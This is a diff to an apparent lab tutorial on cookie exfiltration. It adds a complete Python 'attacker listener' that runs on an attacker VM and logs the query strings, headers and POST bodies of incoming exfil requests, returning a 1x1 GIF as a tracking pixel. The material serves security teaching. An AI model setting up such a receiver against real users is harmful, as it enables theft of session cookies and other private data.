@@ -56,6 +56,101 @@ GET /set-demo-cookie
 
 Save and run `attacker_listener.py` on the attacker VM to capture exfil requests:
 
+```
+#!/usr/bin/env python3
+# attacker_listener.py  (lab-only, improved)
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import urlparse, parse_qs
+
+class Handler(BaseHTTPRequestHandler):
+    protocol_version = "HTTP/1.1"
+
+    def _log_request(self, method):
+        parsed = urlparse(self.path)
+        qs = parse_qs(parsed.query)
+        print(f"=== {method} received ===")
+        print("Path:", parsed.path)
+        if qs:
+            print("Query string:")
+            for k, v in qs.items():
+                print(f"  {k}: {v}")
+        print("Headers:")
+        for k, v in self.headers.items():
+            print(f"  {k}: {v}")
+        print("="*30)
+
+    def do_HEAD(self):
+        # Respond similarly to GET but without a body.
+        try:
+            self._log_request('HEAD')
+            self.send_response(200)
+            self.send_header('Content-Type', 'image/gif')
+            self.send_header('Content-Length', '43')  # length of the 1x1 GIF below
+            self.end_headers()
+        except Exception as e:
+            print("Error handling HEAD:", e)
+            self.send_error(500, "Server Error")
+
+    def do_GET(self):
+        try:
+            self._log_request('GET')
+            self.send_response(200)
+            self.send_header('Content-Type', 'image/gif')
+            self.end_headers()
+            # 1x1 transparent GIF binary (43 bytes)
+            self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
+        except BrokenPipeError:
+            # client closed connection (common with curl) — ignore silently
+            pass
+        except Exception as e:
+            print("Error handling GET:", e)
+            try:
+                self.send_error(500, "Server Error")
+            except:
+                pass
+
+    def do_POST(self):
+        try:
+            length = int(self.headers.get('content-length', 0))
+            body = self.rfile.read(length).decode('utf-8', errors='replace') if length > 0 else ''
+            parsed = urlparse(self.path)
+            qs = parse_qs(parsed.query)
+            print("=== POST received ===")
+            print("Path:", parsed.path)
+            if qs:
+                print("Query string:")
+                for k, v in qs.items():
+                    print(f"  {k}: {v}")
+            print("Headers:")
+            for k, v in self.headers.items():
+                print(f"  {k}: {v}")
+            print("Body:")
+            print(body)
+            print("="*30)
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b'OK')
+        except Exception as e:
+            print("Error handling POST:", e)
+            try:
+                self.send_error(500, "Server Error")
+            except:
+                pass
+
+    # avoid verbose logging to stderr by BaseHTTPRequestHandler
+    def log_message(self, format, *args):
+        return
+
+if __name__ == "__main__":
+    server = HTTPServer(('0.0.0.0', 9000), Handler)
+    print("Listening on http://0.0.0.0:9000 (press Ctrl+C to stop)")
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print("\nShutting down listener")
+        server.server_close()
+```
+
 ```bash
 python3 attacker_listener.py
 # listens on 0.0.0.0:9000
